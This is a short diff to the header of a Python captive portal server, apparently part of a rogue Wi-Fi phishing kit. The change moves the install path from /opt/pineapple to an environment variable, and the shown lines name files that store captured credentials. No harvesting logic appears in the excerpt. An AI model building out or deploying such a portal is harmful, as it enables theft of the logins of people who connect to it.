@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
-"""Captive portal server - reads active template from /opt/pineapple/portals/active.html"""
+"""Captive portal server - reads active template from <install-dir>/portals/active.html"""
 import http.server, datetime, json, os, urllib.parse
 
-BASE = "/opt/pineapple"
+BASE = os.environ.get("PINACOLA_HOME") or os.path.dirname(os.path.abspath(__file__))
 ACTIVE = BASE + "/portals/active.html"
 CREDS_JSON = BASE + "/captured-creds.json"
 CREDS_LOG = BASE + "/captured-creds.log"
